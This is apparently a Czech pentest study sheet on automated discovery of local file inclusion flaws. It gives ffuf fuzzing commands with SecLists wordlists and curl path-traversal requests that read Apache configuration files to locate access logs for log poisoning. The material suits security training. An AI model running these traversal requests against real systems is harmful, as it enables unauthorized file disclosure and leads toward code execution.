Automatizované skenování a fuzzing výrazně urychlují odhalení **LFI/RFI** zranitelností, nezdokumentovaných parametrů i cest k systémovým logům a konfiguracím.

### 📊 Rychlý přehled pro CPTS / Pentest

| **Fáze**                 | **Cíl**                                                | **Nástroj & Příkaz**                                                                  | **Použitý Wordlist (SecLists)**        |
| ------------------------ | ------------------------------------------------------ | ------------------------------------------------------------------------------------- | -------------------------------------- |
| **1. Param Fuzzing**     | Nalezení skrytých/neodkazovaných GET parametrů         | `ffuf -w wordlist:FUZZ -u 'http://target/index.php?FUZZ=value' -fs <SIZE>`            | `burp-parameter-names.txt`             |
| **2. LFI Fuzzing**       | Detekce LFI a automatické obcházení filtrů             | `ffuf -w wordlist:FUZZ -u 'http://target/index.php?param=FUZZ' -fs <SIZE>`            | `LFI-Jhaddix.txt`                      |
| **3. Webroot Discovery** | Zjištění absolutní cesty k kořenovému adresáři webu    | `ffuf -w wordlist:FUZZ -u 'http://target/index.php?param=../../../../FUZZ/index.php'` | `default-web-root-directory-linux.txt` |
| **4. Config/Log Search** | Nalezení cest k logům a konfiguracím pro Log Poisoning | `ffuf -w wordlist:FUZZ -u 'http://target/index.php?param=../../../../FUZZ'`           | `LFI-WordList-Linux`                   |

### 🛠️ Postup automatizovaného testování krok za krokem

#### 1. Hledání nezdokumentovaných parametrů (Parameter Discovery)

Aplikace často obsahují parametrická volání, která nejsou propojena s HTML formuláři.

Bash

```
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' \
     -fs <ORIGINAL_RESPONSE_SIZE>
```

#### 2. Testování LFI Payloadů (Payload Fuzzing)

Jakmile identifikujete zranitelný parametr, otestujte seznam známých traversal řetězců a obcházení:

Bash

```
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' \
     -fs <ORIGINAL_RESPONSE_SIZE>
```

#### 3. Zjištění cesty k Webrootu (Webroot Discovery)

Pokud potřebujete zjistit absolutní cestu (např. pro vložení nahraného webshellu bez znalosti relativní cesty):

Bash

```
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
     -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' \
     -fs <ORIGINAL_RESPONSE_SIZE>
```

_Pokud server vrátí stav 200 pro `/var/www/html/index.php`, potvrdili jste umístění webrootu._

#### 4. Ruční řetězení informací z konfiguračních souborů

Při hledání cest k logům pro Log Poisoning můžete postupovat analyticky:

1. Načtěte hlavní konfiguraci Apache:
    
    Bash
    
    ```
    curl -s "http://<TARGET>/index.php?language=../../../../etc/apache2/apache2.conf"
    # Zjistíte: CustomLog ${APACHE_LOG_DIR}/access.log
    ```
    
2. Načtěte soubor definující proměnné prostředí:
    
    Bash
    
    ```
    curl -s "http://<TARGET>/index.php?language=../../../../etc/apache2/envvars"
    # Zjistíte: export APACHE_LOG_DIR=/var/log/apache2
    ```
    
3. Výsledná cesta pro Log Poisoning: `/var/log/apache2/access.log`.